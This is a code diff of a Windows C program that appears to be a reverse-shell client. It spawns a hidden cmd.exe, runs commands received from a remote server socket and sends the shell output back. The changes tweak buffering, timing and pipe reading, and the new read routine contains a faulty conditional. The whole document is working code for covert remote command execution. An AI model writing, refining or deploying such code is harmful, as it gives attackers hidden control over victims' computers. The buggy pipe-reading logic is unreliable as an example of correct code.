@@ -54,16 +54,17 @@ int main() {
    
     CreateChildProcess(&pi);
 
-    while (1) {
+    while (1) 
+        {
+        memset(recvserver,0,sizeof(recvserver));
         recv(sock,recvserver,sizeof(recvserver),0);
-
+        printf(" recieved %s",recvserver);
         if (strcmp(recvserver, "exit") == 0) {
             break; 
         }
 
-       
         WriteToPipe(recvserver);
-        Sleep(2000);
+        Sleep(5000);
         ReadFromPipe(sock);
     }
     
@@ -75,11 +76,11 @@ int main() {
     closesocket(sock);
 
    
-
     return 0;
 }
 
-void CreateChildProcess(PROCESS_INFORMATION *pi) {
+void CreateChildProcess(PROCESS_INFORMATION *pi) 
+{
     STARTUPINFO si;
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
@@ -88,54 +89,35 @@ void CreateChildProcess(PROCESS_INFORMATION *pi) {
     si.hStdOutput = hWrite_out;
     si.hStdError = hWrite_out;
     si.hStdInput = hRead_in;
-
     
     CreateProcess(NULL, "cmd.exe /Q /K", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, pi);
        
 }
 
-void WriteToPipe(const char *recvserver) {
+void WriteToPipe(const char *recvserver) 
+{
     DWORD dwWritten;
     char command[1000];
-
     
     snprintf(command, sizeof(command), "%s\n", recvserver);
-    
     WriteFile(hWrite_in, command, strlen(command), &dwWritten, NULL);
-        
 }
 
 void ReadFromPipe(SOCKET sock) {
     DWORD dwRead;
-    CHAR chBuf[4096];
+    CHAR chBuf[7000];
     DWORD bytesAvailable;
-    int bytecounter;
-    bytecounter = 0;
 
-    while (1) {
-
-        PeekNamedPipe(hRead_out, NULL, 0, NULL, &bytesAvailable, NULL);
-
-        if (bytesAvailable == 0) {
-            bytecounter++;
-            if (bytecounter > 10) { 
-                break;
-            }
-            Sleep(500);
-            continue;
-        }
+    memset(chBuf,0,sizeof(chBuf));
+    PeekNamedPipe(hRead_out, NULL, 0, NULL, &bytesAvailable, NULL);
+    BOOL success = ReadFile(hRead_out, chBuf, sizeof(chBuf) - 1, &dwRead, NULL);
+    if (!success || dwRead == 0)  
+    chBuf[dwRead] = '\0'; 
+    send(sock,chBuf,strlen(chBuf),0);
         
-        
+    Sleep(200);
 
-        
-        
-        BOOL success = ReadFile(hRead_out, chBuf, sizeof(chBuf) - 1, &dwRead, NULL);
-        if (!success || dwRead == 0) break; 
-
-        chBuf[dwRead] = '\0'; 
-        send(sock,chBuf,sizeof(chBuf),0);
-
-    }
+    
 
 
 
